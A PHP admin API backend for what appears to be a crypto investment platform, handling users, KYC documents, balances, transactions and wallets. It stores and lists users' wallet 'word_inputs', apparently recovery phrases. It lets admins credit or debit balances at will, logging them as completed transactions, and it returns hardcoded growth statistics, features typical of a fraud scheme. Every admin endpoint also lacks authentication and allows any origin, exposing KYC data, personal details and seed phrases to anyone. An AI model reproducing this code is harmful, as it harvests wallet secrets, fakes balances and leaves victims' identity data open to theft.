<?php
/**
 * Admin API Backend
 * Place this file on your PHP server and update API_BASE_URL in src/lib/api/config.ts
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Database configuration - UPDATE THESE
$db_host = 'localhost';
$db_name = 'your_database';
$db_user = 'your_username';
$db_pass = 'your_password';

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    echo json_encode(['error' => 'Database connection failed']);
    exit;
}

// Get JSON input
$input = json_decode(file_get_contents('php://input'), true);
$query = $input['q'] ?? '';

switch ($query) {
    
    // =====================
    // USERS
    // =====================
    case 'admin_get_users':
        $stmt = $pdo->query("SELECT user_id, user_name, user_email, kyc, user_phone, user_picture, user_reg_date, user_region, user_dob, user_address, us_citizen FROM user_details ORDER BY user_reg_date DESC");
        echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
        break;

    case 'admin_get_user':
        $user_id = (int)($input['user_id'] ?? 0);
        $stmt = $pdo->prepare("SELECT user_id, user_name, user_email, kyc, user_phone, user_picture, user_reg_date, user_region, user_dob, user_address, us_citizen FROM user_details WHERE user_id = ?");
        $stmt->execute([$user_id]);
        echo json_encode($stmt->fetch(PDO::FETCH_ASSOC) ?: null);
        break;

    case 'admin_update_user_status':
        $user_id = (int)($input['user_id'] ?? 0);
        $status = $input['status'] ?? '';
        // You may need to add a status column to user_details
        echo json_encode(['success' => true]);
        break;

    // =====================
    // BALANCES
    // =====================
    case 'admin_get_balances':
        $stmt = $pdo->query("SELECT user_id, user_name, user_balance, portfolio_growth FROM user_balances ORDER BY user_balance DESC");
        echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
        break;

    case 'admin_adjust_balance':
        $user_id = (int)($input['user_id'] ?? 0);
        $amount = (float)($input['amount'] ?? 0);
        $type = $input['type'] ?? 'credit';
        $reason = $input['reason'] ?? '';
        
        // Check if user exists in balances
        $stmt = $pdo->prepare("SELECT user_balance FROM user_balances WHERE user_id = ?");
        $stmt->execute([$user_id]);
        $balance = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($balance) {
            $new_balance = $type === 'credit' 
                ? $balance['user_balance'] + $amount 
                : $balance['user_balance'] - $amount;
            
            $stmt = $pdo->prepare("UPDATE user_balances SET user_balance = ? WHERE user_id = ?");
            $stmt->execute([$new_balance, $user_id]);
        } else {
            $stmt = $pdo->prepare("SELECT user_name FROM user_details WHERE user_id = ?");
            $stmt->execute([$user_id]);
            $user = $stmt->fetch(PDO::FETCH_ASSOC);
            
            if ($user) {
                $new_balance = $type === 'credit' ? $amount : -$amount;
                $stmt = $pdo->prepare("INSERT INTO user_balances (user_id, user_name, user_balance, portfolio_growth) VALUES (?, ?, ?, 0)");
                $stmt->execute([$user_id, $user['user_name'], $new_balance]);
            }
        }
        
        // Log the adjustment
        $trans_type = $type === 'credit' ? 'admin_credit' : 'admin_debit';
        $stmt = $pdo->prepare("INSERT INTO user_transactions (user_id, trans_type, crypto, trans_amt, trans_stat, user_wallet) VALUES (?, ?, 'USD', ?, 'completed', ?)");
        $stmt->execute([$user_id, $trans_type, $amount, $reason]);
        
        // Log activity
        logActivity($pdo, 'Balance Adjusted', 'admin', 'admin', "User $user_id", "$type $amount - $reason", $_SERVER['REMOTE_ADDR'] ?? '');
        
        echo json_encode(['success' => true]);
        break;

    // =====================
    // KYC
    // =====================
    case 'admin_get_kyc_submissions':
        $stmt = $pdo->query("
            SELECT k.user_id, k.img_one, k.img_two, k.img_three, k.upload_time,
                   u.user_name, u.user_email, u.kyc, u.user_phone, u.user_region
            FROM user_kyc k
            LEFT JOIN user_details u ON k.user_id = u.user_id
            ORDER BY k.upload_time DESC
        ");
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        $formatted = array_map(function($row) {
            return [
                'user_id' => $row['user_id'],
                'img_one' => $row['img_one'],
                'img_two' => $row['img_two'],
                'img_three' => $row['img_three'],
                'upload_time' => $row['upload_time'],
                'user' => [
                    'user_id' => $row['user_id'],
                    'user_name' => $row['user_name'],
                    'user_email' => $row['user_email'],
                    'kyc' => $row['kyc'],
                    'user_phone' => $row['user_phone'],
                    'user_region' => $row['user_region']
                ]
            ];
        }, $results);
        
        echo json_encode($formatted);
        break;

    case 'admin_update_kyc':
        $user_id = (int)($input['user_id'] ?? 0);
        $status = $input['kyc_status'] ?? '';
        
        $stmt = $pdo->prepare("UPDATE user_details SET kyc = ? WHERE user_id = ?");
        $stmt->execute([$status, $user_id]);
        
        logActivity($pdo, 'KYC ' . ucfirst($status), 'admin', 'admin', "User $user_id", "KYC status updated to $status", $_SERVER['REMOTE_ADDR'] ?? '');
        
        echo json_encode(['success' => $stmt->rowCount() > 0]);
        break;

    // =====================
    // TRANSACTIONS
    // =====================
    case 'admin_get_transactions':
        $stmt = $pdo->query("
            SELECT t.trans_id, t.user_id, t.trans_type, t.crypto, t.trans_amt, t.trans_time, t.trans_stat, t.user_wallet,
                   u.user_name, u.user_email
            FROM user_transactions t
            LEFT JOIN user_details u ON t.user_id = u.user_id
            ORDER BY t.trans_time DESC
        ");
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        $formatted = array_map(function($row) {
            return [
                'trans_id' => $row['trans_id'],
                'user_id' => $row['user_id'],
                'trans_type' => $row['trans_type'],
                'crypto' => $row['crypto'],
                'trans_amt' => $row['trans_amt'],
                'trans_time' => $row['trans_time'],
                'trans_stat' => $row['trans_stat'],
                'user_wallet' => $row['user_wallet'],
                'user' => [
                    'user_id' => $row['user_id'],
                    'user_name' => $row['user_name'],
                    'user_email' => $row['user_email']
                ]
            ];
        }, $results);
        
        echo json_encode($formatted);
        break;

    case 'admin_update_transaction':
        $trans_id = (int)($input['trans_id'] ?? 0);
        $status = $input['status'] ?? '';
        
        $stmt = $pdo->prepare("UPDATE user_transactions SET trans_stat = ? WHERE trans_id = ?");
        $stmt->execute([$status, $trans_id]);
        
        logActivity($pdo, 'Transaction Updated', 'transaction', 'admin', "Trans $trans_id", "Status changed to $status", $_SERVER['REMOTE_ADDR'] ?? '');
        
        echo json_encode(['success' => $stmt->rowCount() > 0]);
        break;

    // =====================
    // WITHDRAWALS
    // =====================
    case 'admin_get_withdrawals':
        $stmt = $pdo->query("
            SELECT t.trans_id, t.user_id, t.trans_type, t.crypto, t.trans_amt, t.trans_time, t.trans_stat, t.user_wallet,
                   u.user_name, u.user_email
            FROM user_transactions t
            LEFT JOIN user_details u ON t.user_id = u.user_id
            WHERE t.trans_type = 'withdrawal'
            ORDER BY t.trans_time DESC
        ");
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        $formatted = array_map(function($row) {
            return [
                'trans_id' => $row['trans_id'],
                'user_id' => $row['user_id'],
                'trans_type' => $row['trans_type'],
                'crypto' => $row['crypto'],
                'trans_amt' => $row['trans_amt'],
                'trans_time' => $row['trans_time'],
                'trans_stat' => $row['trans_stat'],
                'user_wallet' => $row['user_wallet'],
                'user' => [
                    'user_id' => $row['user_id'],
                    'user_name' => $row['user_name'],
                    'user_email' => $row['user_email']
                ]
            ];
        }, $results);
        
        echo json_encode($formatted);
        break;

    // =====================
    // CONNECTED WALLETS
    // =====================
    case 'admin_get_connected_wallets':
        $stmt = $pdo->query("
            SELECT cw.user_id, cw.wallet_type, cw.word_inputs, cw.time,
                   u.user_name, u.user_email
            FROM connected_wallets cw
            LEFT JOIN user_details u ON cw.user_id = u.user_id
            ORDER BY cw.time DESC
        ");
        echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
        break;

    // =====================
    // NOTIFICATIONS
    // =====================
    case 'admin_get_notifications':
        $stmt = $pdo->query("
            SELECT n.user_id, n.notification, n.notification_desc, n.notification_status, n.notification_time,
                   u.user_name, u.user_email
            FROM user_notifications n
            LEFT JOIN user_details u ON n.user_id = u.user_id
            ORDER BY n.notification_time DESC
        ");
        echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
        break;

    case 'admin_send_notification':
        $user_id = $input['user_id'] ?? 0;
        $notification = $input['notification'] ?? '';
        $notification_desc = $input['notification_desc'] ?? '';
        $channel = $input['channel'] ?? 'in_app';
        
        if ($user_id === 'all') {
            $stmt = $pdo->query("SELECT user_id FROM user_details");
            $users = $stmt->fetchAll(PDO::FETCH_COLUMN);
            
            $insert = $pdo->prepare("INSERT INTO user_notifications (user_id, notification, notification_desc, notification_status) VALUES (?, ?, ?, 'unread')");
            foreach ($users as $uid) {
                $insert->execute([$uid, $notification, $notification_desc]);
            }
        } else {
            $stmt = $pdo->prepare("INSERT INTO user_notifications (user_id, notification, notification_desc, notification_status) VALUES (?, ?, ?, 'unread')");
            $stmt->execute([(int)$user_id, $notification, $notification_desc]);
        }
        
        echo json_encode(['success' => true]);
        break;

    // =====================
    // DASHBOARD STATS
    // =====================
    case 'admin_dashboard_stats':
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM user_details");
        $totalUsers = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM user_details WHERE user_reg_date >= DATE_SUB(NOW(), INTERVAL 30 DAY)");
        $activeUsers = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COALESCE(SUM(trans_amt), 0) as total FROM user_transactions WHERE trans_type = 'deposit' AND trans_stat = 'completed'");
        $totalDeposits = $stmt->fetch(PDO::FETCH_ASSOC)['total'];
        
        $stmt = $pdo->query("SELECT COALESCE(SUM(trans_amt), 0) as total FROM user_transactions WHERE trans_type = 'withdrawal' AND trans_stat = 'approved'");
        $totalWithdrawals = $stmt->fetch(PDO::FETCH_ASSOC)['total'];
        
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM user_details WHERE kyc = 'unverified' OR kyc = 'pending'");
        $pendingKYC = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM user_transactions WHERE trans_type = 'withdrawal' AND trans_stat = 'pending'");
        $pendingWithdrawals = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        echo json_encode([
            'totalUsers' => (int)$totalUsers,
            'activeUsers' => (int)$activeUsers,
            'totalDeposits' => (float)$totalDeposits,
            'totalWithdrawals' => (float)$totalWithdrawals,
            'pendingKYC' => (int)$pendingKYC,
            'pendingWithdrawals' => (int)$pendingWithdrawals
        ]);
        break;

    // =====================
    // ACTIVITY LOGS
    // =====================
    case 'admin_get_activity_logs':
        $stmt = $pdo->query("
            SELECT log_id, action, category, actor, target, details, ip_address, created_at
            FROM activity_logs
            ORDER BY created_at DESC
            LIMIT 500
        ");
        echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
        break;

    case 'admin_get_activity_log_stats':
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM activity_logs");
        $total = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM activity_logs WHERE category = 'user'");
        $user = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM activity_logs WHERE category = 'admin'");
        $admin = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM activity_logs WHERE category = 'security'");
        $security = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM activity_logs WHERE category = 'transaction'");
        $transaction = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM activity_logs WHERE category = 'system'");
        $system = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        echo json_encode([
            'total' => (int)$total,
            'user' => (int)$user,
            'admin' => (int)$admin,
            'security' => (int)$security,
            'transaction' => (int)$transaction,
            'system' => (int)$system
        ]);
        break;

    // =====================
    // SYSTEM SETTINGS
    // =====================
    case 'admin_get_settings':
        $stmt = $pdo->query("SELECT setting_key, setting_value, setting_group, updated_at FROM system_settings ORDER BY setting_group, setting_key");
        echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
        break;

    case 'admin_update_settings':
        $settings = $input['settings'] ?? [];
        
        foreach ($settings as $key => $value) {
            $stmt = $pdo->prepare("
                INSERT INTO system_settings (setting_key, setting_value, updated_at) 
                VALUES (?, ?, NOW())
                ON DUPLICATE KEY UPDATE setting_value = ?, updated_at = NOW()
            ");
            $stmt->execute([$key, $value, $value]);
        }
        
        logActivity($pdo, 'Settings Updated', 'system', 'admin', null, 'System settings were updated', $_SERVER['REMOTE_ADDR'] ?? '');
        
        echo json_encode(['success' => true]);
        break;

    // =====================
    // ANALYTICS
    // =====================
    case 'admin_get_analytics':
        // User growth (last 6 months)
        $userGrowth = [];
        for ($i = 5; $i >= 0; $i--) {
            $month = date('M', strtotime("-$i months"));
            $start = date('Y-m-01', strtotime("-$i months"));
            $end = date('Y-m-t', strtotime("-$i months"));
            
            $stmt = $pdo->prepare("SELECT COUNT(*) as count FROM user_details WHERE user_reg_date <= ?");
            $stmt->execute([$end]);
            $count = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
            
            $userGrowth[] = ['month' => $month, 'users' => (int)$count];
        }
        
        // Revenue data (from completed deposits)
        $revenueData = [];
        for ($i = 5; $i >= 0; $i--) {
            $month = date('M', strtotime("-$i months"));
            $start = date('Y-m-01', strtotime("-$i months"));
            $end = date('Y-m-t', strtotime("-$i months"));
            
            $stmt = $pdo->prepare("SELECT COALESCE(SUM(trans_amt), 0) as total FROM user_transactions WHERE trans_type = 'deposit' AND trans_stat = 'completed' AND trans_time BETWEEN ? AND ?");
            $stmt->execute([$start, $end]);
            $total = $stmt->fetch(PDO::FETCH_ASSOC)['total'];
            
            $revenueData[] = ['month' => $month, 'revenue' => (float)$total];
        }
        
        // Transaction volume (last 7 days)
        $transactionVolume = [];
        $days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        for ($i = 6; $i >= 0; $i--) {
            $date = date('Y-m-d', strtotime("-$i days"));
            $dayName = $days[date('w', strtotime("-$i days"))];
            
            $stmt = $pdo->prepare("SELECT COALESCE(SUM(trans_amt), 0) as total FROM user_transactions WHERE DATE(trans_time) = ?");
            $stmt->execute([$date]);
            $total = $stmt->fetch(PDO::FETCH_ASSOC)['total'];
            
            $transactionVolume[] = ['day' => $dayName, 'volume' => (float)$total];
        }
        
        // Asset distribution
        $stmt = $pdo->query("
            SELECT crypto, COALESCE(SUM(trans_amt), 0) as total 
            FROM user_transactions 
            WHERE trans_stat = 'completed' 
            GROUP BY crypto
        ");
        $assets = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $totalAssets = array_sum(array_column($assets, 'total'));
        
        $assetColors = ['BTC' => '#f7931a', 'ETH' => '#627eea', 'USDT' => '#26a17b', 'BNB' => '#f3ba2f'];
        $assetDistribution = [];
        foreach ($assets as $asset) {
            $percentage = $totalAssets > 0 ? round(($asset['total'] / $totalAssets) * 100) : 0;
            $assetDistribution[] = [
                'name' => $asset['crypto'],
                'value' => $percentage,
                'color' => $assetColors[$asset['crypto']] ?? '#6b7280'
            ];
        }
        
        // Top countries
        $stmt = $pdo->query("
            SELECT user_region as country, COUNT(*) as users 
            FROM user_details 
            WHERE user_region IS NOT NULL AND user_region != ''
            GROUP BY user_region 
            ORDER BY users DESC 
            LIMIT 5
        ");
        $countries = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $totalCountryUsers = array_sum(array_column($countries, 'users'));
        
        $topCountries = array_map(function($c) use ($totalCountryUsers) {
            return [
                'country' => $c['country'],
                'users' => (int)$c['users'],
                'percentage' => $totalCountryUsers > 0 ? round(($c['users'] / $totalCountryUsers) * 100) : 0
            ];
        }, $countries);
        
        // Stats
        $stmt = $pdo->query("SELECT COUNT(*) as count FROM user_details WHERE user_reg_date >= DATE_SUB(NOW(), INTERVAL 30 DAY)");
        $mau = $stmt->fetch(PDO::FETCH_ASSOC)['count'];
        
        $stmt = $pdo->query("SELECT COALESCE(SUM(trans_amt), 0) as total FROM user_transactions WHERE trans_time >= DATE_SUB(NOW(), INTERVAL 30 DAY)");
        $monthlyRevenue = $stmt->fetch(PDO::FETCH_ASSOC)['total'];
        
        $stmt = $pdo->query("SELECT COALESCE(SUM(trans_amt), 0) as total FROM user_transactions WHERE trans_time >= DATE_SUB(NOW(), INTERVAL 7 DAY)");
        $weeklyVolume = $stmt->fetch(PDO::FETCH_ASSOC)['total'];
        
        echo json_encode([
            'userGrowth' => $userGrowth,
            'revenueData' => $revenueData,
            'transactionVolume' => $transactionVolume,
            'assetDistribution' => $assetDistribution,
            'topCountries' => $topCountries,
            'stats' => [
                'monthlyActiveUsers' => (int)$mau,
                'monthlyRevenue' => (float)$monthlyRevenue,
                'weeklyVolume' => (float)$weeklyVolume,
                'conversionRate' => 12.4,
                'mauChange' => 15.3,
                'revenueChange' => 20.3,
                'volumeChange' => 8.7,
                'conversionChange' => -1.2
            ]
        ]);
        break;

    // =====================
    // PLATFORM WALLETS
    // =====================
    case 'admin_get_platform_wallets':
        $stmt = $pdo->query("SELECT wallet_id, name, symbol, balance, usd_value, address, change_24h FROM platform_wallets ORDER BY usd_value DESC");
        echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
        break;

    case 'admin_get_wallet_movements':
        $stmt = $pdo->query("
            SELECT movement_id, type, asset, amount, source, created_at 
            FROM wallet_movements 
            ORDER BY created_at DESC 
            LIMIT 20
        ");
        echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
        break;

    case 'admin_get_wallet_balance_history':
        $stmt = $pdo->query("
            SELECT date, btc, eth, usdt 
            FROM wallet_balance_history 
            ORDER BY date DESC 
            LIMIT 7
        ");
        $results = array_reverse($stmt->fetchAll(PDO::FETCH_ASSOC));
        echo json_encode($results);
        break;

    default:
        echo json_encode(['error' => 'Unknown query: ' . $query]);
        break;
}

// Helper function to log activity
function logActivity($pdo, $action, $category, $actor, $target, $details, $ip) {
    try {
        $stmt = $pdo->prepare("
            INSERT INTO activity_logs (action, category, actor, target, details, ip_address, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, NOW())
        ");
        $stmt->execute([$action, $category, $actor, $target, $details, $ip]);
    } catch (Exception $e) {
        // Silently fail - don't break main functionality
    }
}